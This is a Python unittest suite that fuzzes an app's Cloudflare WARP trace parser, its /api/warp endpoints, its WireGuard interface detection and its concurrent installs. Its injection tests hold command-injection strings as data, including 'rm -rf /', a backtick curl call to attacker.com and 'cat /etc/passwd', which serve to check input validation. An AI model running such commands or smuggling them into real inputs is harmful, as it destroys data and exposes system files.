"""
InnerBlitz Milestone M1: Empirical Challenger Fuzzing & Boundary Verification Suite
Adversarial challenge tests covering:
1. Cloudflare trace parser fuzzing (malformed, binary, long lines, injections, HTML doctypes)
2. API endpoint boundary fuzzing (/api/warp/install, /api/warp/toggle, /api/warp/diagnostics, /api/warp/install-log)
3. WireGuard interface detection under broken sysfs, missing interfaces, down states, and renamed interfaces
4. Concurrency, race conditions, and ring buffer thread-safety
"""

import asyncio
import os
import secrets
import tempfile
import unittest
from pathlib import Path
from unittest.mock import patch, MagicMock

from starlette.testclient import TestClient

from app.config import settings
from app.core import warp
from app.core.warp import (
    WarpMode,
    WarpStatusLevel,
    WarpInstallStatus,
    parse_cloudflare_trace,
    check_socks5_alive,
    check_wireguard_interface,
    detect_warp,
    query_cloudflare_trace,
    query_warp_diagnostics,
    sync_warp_settings_from_detection,
    WarpProcessManager
)
from app.database import crud
from tests.e2e.harness import OpaqueE2ETestCase, CLOUDFLARE_TRACE_SAMPLES


class TestTraceParserFuzzing(unittest.TestCase):
    """Adversarial stress and fuzz tests for parse_cloudflare_trace."""

    def test_missing_equals_signs(self):
        """Fuzz with input containing no equals signs: should return empty dict, never crash."""
        payloads = [
            "HTTP/1.1 502 Bad Gateway\r\nServer: cloudflare\r\nConnection: close",
            "Error 1020: Access Denied",
            "Random text with symbols !@#$%^&*()_+\nNext line without eq",
            "A" * 5000,
            "\n\n\n   \t\r\n   \n",
        ]
        for p in payloads:
            res = parse_cloudflare_trace(p)
            self.assertIsInstance(res, dict)
            self.assertEqual(len(res), 0)

    def test_binary_and_null_bytes(self):
        """Fuzz with binary characters, null bytes, and non-ASCII unicode."""
        p1 = "ip=104.28.1.1\x00\nwarp=on\x00extra\ncolo=DME\x01\x02\n"
        res1 = parse_cloudflare_trace(p1)
        self.assertIn("ip", res1)
        self.assertEqual(res1["ip"], "104.28.1.1\x00")
        self.assertEqual(res1["warp"], "on\x00extra")

        p2 = "ip=1.2.3.4\ncolo=🚀_HEL\nwarp=on\nloc=Россия\n"
        res2 = parse_cloudflare_trace(p2)
        self.assertEqual(res2["colo"], "🚀_HEL")
        self.assertEqual(res2["loc"], "Россия")

        p3 = "k\xff\xfe=\xaa\xbb\nip=5.6.7.8"
        res3 = parse_cloudflare_trace(p3)
        self.assertEqual(res3["ip"], "5.6.7.8")

    def test_extremely_long_lines_and_payloads(self):
        """Fuzz with extremely long line and thousands of lines."""
        huge_val = "x" * (1024 * 1024)
        huge_line = f"huge_key={huge_val}\nwarp=on"
        res = parse_cloudflare_trace(huge_line)
        self.assertEqual(res["warp"], "on")
        self.assertEqual(len(res["huge_key"]), 1024 * 1024)

        lines = [f"k{i}=v{i}" for i in range(10000)]
        lines.append("warp=plus")
        big_payload = "\n".join(lines)
        res_big = parse_cloudflare_trace(big_payload)
        self.assertEqual(len(res_big), 10001)
        self.assertEqual(res_big["warp"], "plus")

    def test_injection_attempts(self):
        """Fuzz with SQL, command, CRLF, and format string injection strings."""
        injections = [
            "warp=on\r\nip=1.2.3.4\r\ngateway=off",
            "ip=104.28.1.1' OR '1'='1' --",
            "colo=$(rm -rf /; whoami)",
            "loc=%s%s%s%n",
            "kex=`curl http://attacker.com`",
            "ts=12345; cat /etc/passwd",
        ]
        for inj in injections:
            res = parse_cloudflare_trace(inj)
            self.assertIsInstance(res, dict)

    def test_malformed_html_and_doctypes(self):
        """Fuzz with standard HTML challenge pages and HTML tags."""
        html_payloads_to_reject = [
            "<!DOCTYPE html><html><body>Error</body></html>",
            "<!doctype html><html><body>Error</body></html>",
            "<HTML><BODY>Access Denied</BODY></HTML>",
            "<html><head><title>502</title></head></html>",
            "   <!DOCTYPE html>\n<html>",
        ]
        for hp in html_payloads_to_reject:
            with self.assertRaises(ValueError, msg=f"Should reject HTML payload: {hp[:30]}"):
                parse_cloudflare_trace(hp)

    def test_html_doctype_edge_case_empirical_finding(self):
        """
        Adversarial probe: Test case-sensitivity and gap in DOCTYPE detection.
        When Cloudflare returns an HTML error without an explicit <html tag:
        e.g. '<!doctype html>\\n<meta charset=\"utf-8\">\\n<title>502</title>'
        or '<!DOCTYPE HTML>\\n<title>502 Bad Gateway</title>'
        """
        tricky_html_1 = '<!doctype html>\n<meta charset="utf-8">\n<title>502</title>'
        tricky_html_2 = '<!DOCTYPE HTML>\n<title>502 Bad Gateway</title>'

        with self.assertRaises(ValueError):
            parse_cloudflare_trace(tricky_html_1)
        with self.assertRaises(ValueError):
            parse_cloudflare_trace(tricky_html_2)

    def test_structural_edge_cases(self):
        """Fuzz lines with multiple equals, missing keys, missing values, empty strings."""
        with self.assertRaises(ValueError):
            parse_cloudflare_trace("")

        p_multi = "complex=a=b=c=d\nwarp=on"
        res_multi = parse_cloudflare_trace(p_multi)
        self.assertEqual(res_multi["complex"], "a=b=c=d")
        self.assertEqual(res_multi["warp"], "on")

        p_empty_val = "ip=\nwarp=on"
        res_empty_val = parse_cloudflare_trace(p_empty_val)
        self.assertEqual(res_empty_val["ip"], "")
        self.assertEqual(res_empty_val["warp"], "on")

        p_empty_key = "=test_value\nwarp=on"
        res_empty_key = parse_cloudflare_trace(p_empty_key)
        self.assertEqual(res_empty_key[""], "test_value")

        p_dupe = "warp=off\nwarp=on\nwarp=plus"
        res_dupe = parse_cloudflare_trace(p_dupe)
        self.assertEqual(res_dupe["warp"], "plus")


class TestEndpointBoundaryFuzzing(OpaqueE2ETestCase):
    """Adversarial boundary and type fuzzing for /api/warp REST endpoints."""

    def setUp(self):
        super().setUp()
        self.login_admin()

    def test_install_port_boundaries(self):
        """Test port validation boundaries on /api/warp/install."""
        invalid_ports = [-9999, -1, 0, 1, 80, 443, 1023, 65536, 70000, 999999]
        for port in invalid_ports:
            resp = self.client.post("/api/warp/install", json={"mode": "auto", "port": port})
            self.assertEqual(
                resp.status_code, 422,
                f"Port {port} should fail Pydantic validation with HTTP 422, got {resp.status_code}"
            )

        with patch.object(warp.warp_installer, "start_install", return_value=(True, "OK")):
            resp_min = self.client.post("/api/warp/install", json={"mode": "auto", "port": 1024, "force": True})
            self.assertEqual(resp_min.status_code, 202)

            resp_max = self.client.post("/api/warp/install", json={"mode": "auto", "port": 65535, "force": True})
            self.assertEqual(resp_max.status_code, 202)

    def test_install_mode_fuzzing(self):
        """Test mode parameter validation and injection attempts on /api/warp/install."""
        invalid_modes = [
            "wireguard",  # install mode only accepts auto, socks5, wgcf
            "invalid",
            "auto; rm -rf /",
            "$(whoami)",
            "' OR '1'='1",
            "",
            "   ",
        ]
        for mode in invalid_modes:
            resp = self.client.post("/api/warp/install", json={"mode": mode, "port": 40000})
            self.assertEqual(
                resp.status_code, 422,
                f"Mode '{mode}' should fail Pydantic validation with HTTP 422, got {resp.status_code}"
            )

        for bad_mode in [123, True, [], {}]:
            resp = self.client.post("/api/warp/install", json={"mode": bad_mode, "port": 40000})
            self.assertEqual(resp.status_code, 422)

    def test_toggle_port_boundaries(self):
        """Test port parameter validation boundaries on /api/warp/toggle."""
        invalid_ports = [-100, -1, 0, 80, 1023, 65536, 100000]
        for port in invalid_ports:
            resp = self.client.post("/api/warp/toggle", json={"enabled": True, "port": port, "mode": "socks5"})
            self.assertEqual(
                resp.status_code, 422,
                f"Port {port} on toggle should return 422, got {resp.status_code}"
            )

        resp_1024 = self.client.post("/api/warp/toggle", json={"enabled": True, "port": 1024, "mode": "socks5"})
        self.assertEqual(resp_1024.status_code, 200)

        resp_65535 = self.client.post("/api/warp/toggle", json={"enabled": True, "port": 65535, "mode": "socks5"})
        self.assertEqual(resp_65535.status_code, 200)

    def test_toggle_mode_validation(self):
        """Test mode parameter validation on /api/warp/toggle (only socks5 or wireguard allowed)."""
        invalid_modes = ["auto", "wgcf", "invalid", "socks5; id", ""]
        for mode in invalid_modes:
            resp = self.client.post("/api/warp/toggle", json={"enabled": True, "port": 40000, "mode": mode})
            self.assertEqual(
                resp.status_code, 422,
                f"Mode '{mode}' on toggle should return 422, got {resp.status_code}"
            )

        resp_socks5 = self.client.post("/api/warp/toggle", json={"enabled": True, "port": 40000, "mode": "socks5"})
        self.assertEqual(resp_socks5.status_code, 200)

        resp_wg = self.client.post("/api/warp/toggle", json={"enabled": True, "port": 40000, "mode": "wireguard"})
        self.assertEqual(resp_wg.status_code, 200)

    def test_diagnostics_timeout_boundaries(self):
        """Test query parameter validation on /api/warp/diagnostics."""
        invalid_timeouts = [-5.0, 0.0, 0.5, 0.99, 15.01, 20.0, 100.0, "fast"]
        for t in invalid_timeouts:
            resp = self.client.get(f"/api/warp/diagnostics?timeout={t}")
            self.assertEqual(
                resp.status_code, 422,
                f"Diagnostics timeout={t} should return 422, got {resp.status_code}"
            )

        with patch("app.core.warp.query_warp_diagnostics", return_value={
            "timestamp": "2026-10-26T16:00:00Z",
            "warp_active": False,
            "mode": "none",
            "status_level": "offline",
            "direct": {"reachable": True, "ip": "1.2.3.4", "warp": "off"},
            "warp": {"reachable": False, "ip": None, "warp": "off"},
            "summary": {"ip_masked": False, "warp_status": "off"}
        }):
            resp_1 = self.client.get("/api/warp/diagnostics?timeout=1.0")
            self.assertEqual(resp_1.status_code, 200)

            resp_15 = self.client.get("/api/warp/diagnostics?timeout=15.0")
            self.assertEqual(resp_15.status_code, 200)

    def test_install_log_pagination_boundaries(self):
        """Test offset and limit parameter boundaries on /api/warp/install-log."""
        invalid_params = [
            ("offset=-1&limit=50", 422),
            ("offset=0&limit=0", 422),
            ("offset=0&limit=-10", 422),
            ("offset=0&limit=1001", 422),
            ("offset=abc&limit=50", 422),
        ]
        for query, expected_status in invalid_params:
            resp = self.client.get(f"/api/warp/install-log?{query}")
            self.assertEqual(resp.status_code, expected_status)

        resp_huge = self.client.get("/api/warp/install-log?offset=9999999&limit=100")
        self.assertEqual(resp_huge.status_code, 200)
        data = resp_huge.json()
        self.assertEqual(len(data["logs"]), 0)
        self.assertFalse(data["has_more"])


class TestWireGuardInterfaceDetectionFuzzing(unittest.TestCase):
    """Adversarial boundary tests for WireGuard interface detection under broken sysfs / missing interfaces."""

    def test_missing_all_interfaces(self):
        """Verify check_wireguard_interface returns None when no interfaces exist."""
        with patch("app.core.warp.psutil.net_if_stats", return_value={}), \
             patch("app.core.warp.psutil.net_if_addrs", return_value={}), \
             patch("pathlib.Path.exists", return_value=False), \
             patch("shutil.which", return_value=None):
            res = check_wireguard_interface()
            self.assertIsNone(res)

    def test_broken_sysfs_operstate_down_with_valid_flags(self):
        """When operstate is 'down' and flags has IFF_UP cleared, interface must NOT be returned."""
        with patch("app.core.warp.psutil.net_if_stats", return_value={}), \
             patch("app.core.warp.psutil.net_if_addrs", return_value={}), \
             patch("shutil.which", return_value=None):

            def fake_read_text(self_path, encoding="utf-8"):
                if "operstate" in str(self_path):
                    return "down\n"
                if "flags" in str(self_path):
                    return "0x1002\n"  # bit 0 is 0 (not IFF_UP)
                raise FileNotFoundError()

            with patch("pathlib.Path.exists", return_value=True), \
                 patch("pathlib.Path.read_text", fake_read_text):
                res = check_wireguard_interface(["warp"])
                self.assertIsNone(res, "Down interface in sysfs should NOT be detected as active")

    def test_broken_sysfs_missing_flags_when_down_finding(self):
        """
        Adversarial probe: When operstate is 'down' but 'flags' raises FileNotFoundError,
        app/core/warp.py:130-131 'except Exception: return iface' incorrectly returns iface!
        This test proves the false-positive vulnerability.
        """
        with patch("app.core.warp.psutil.net_if_stats", return_value={}), \
             patch("app.core.warp.psutil.net_if_addrs", return_value={}), \
             patch("shutil.which", return_value=None):

            def fake_read_text(self_path, encoding="utf-8"):
                if "operstate" in str(self_path):
                    return "down\n"
                if "flags" in str(self_path):
                    raise FileNotFoundError("flags not found")
                raise FileNotFoundError()

            with patch("pathlib.Path.exists", return_value=True), \
                 patch("pathlib.Path.read_text", fake_read_text):
                res = check_wireguard_interface(["warp"])
                self.assertIsNone(res, "check_wireguard_interface must not return down interface on missing flags exception")

    def test_psutil_interface_down_with_cached_addrs_finding(self):
        """
        Adversarial probe: psutil stats shows isup=False, but addrs has IP.
        In app/core/warp.py:116: 'if addrs[iface]: return iface'
        Empirically verify that warp.py returns None when isup=False!
        """
        mock_stats = {"warp": MagicMock(isup=False)}
        mock_addrs = {"warp": [MagicMock(address="10.0.0.2")]}

        with patch("app.core.warp.psutil.net_if_stats", return_value=mock_stats), \
             patch("app.core.warp.psutil.net_if_addrs", return_value=mock_addrs):
            res = check_wireguard_interface(["warp"])
            self.assertIsNone(res, "check_wireguard_interface must not return interface with isup=False")

    def test_renamed_interface_candidate_names(self):
        """Test candidate_names parameter behavior for custom or renamed WireGuard interfaces."""
        mock_stats = {"wg-custom": MagicMock(isup=True)}
        mock_addrs = {"wg-custom": [MagicMock(address="10.0.0.3")]}

        with patch("app.core.warp.psutil.net_if_stats", return_value=mock_stats), \
             patch("app.core.warp.psutil.net_if_addrs", return_value=mock_addrs):
            res_default = check_wireguard_interface()
            self.assertIsNone(res_default)

            res_custom = check_wireguard_interface(candidate_names=["wg-custom"])
            self.assertEqual(res_custom, "wg-custom")


class TestConcurrencyAndProcessManager(unittest.TestCase):
    """Concurrency, race condition, and stress tests for WarpProcessManager."""

    def test_concurrent_start_install_calls(self):
        """Verify that concurrent calls to start_install do not produce race conditions."""
        async def run_test():
            mgr = WarpProcessManager()
            # Patch _run_installer_coroutine to avoid executing real external bash script
            with patch.object(mgr, "_run_installer_coroutine", return_value=None):
                results = await asyncio.gather(
                    mgr.start_install(mode="auto", port=40000),
                    mgr.start_install(mode="auto", port=40001),
                    mgr.start_install(mode="auto", port=40002),
                    mgr.start_install(mode="auto", port=40003),
                    mgr.start_install(mode="auto", port=40004),
                )
                success_count = sum(1 for ok, _ in results if ok)
                fail_count = sum(1 for ok, _ in results if not ok)
                self.assertEqual(success_count, 1, "Exactly one install attempt should succeed")
                self.assertEqual(fail_count, 4, "All other concurrent attempts must be rejected")

        asyncio.run(run_test())

    def test_ring_buffer_thread_safety_under_rapid_append(self):
        """Verify ring buffer maintains bounded size and offset safety under rapid appends."""
        mgr = WarpProcessManager(max_log_lines=50)
        for i in range(200):
            mgr._append_log(f"Log line {i}")

        logs_data = mgr.get_logs(offset=0, limit=100)
        self.assertEqual(logs_data["total_lines"], 200)
        self.assertEqual(len(logs_data["logs"]), 50)
        self.assertIn("Log line 150", logs_data["logs"][0])
        self.assertIn("Log line 199", logs_data["logs"][-1])


if __name__ == "__main__":
    unittest.main()
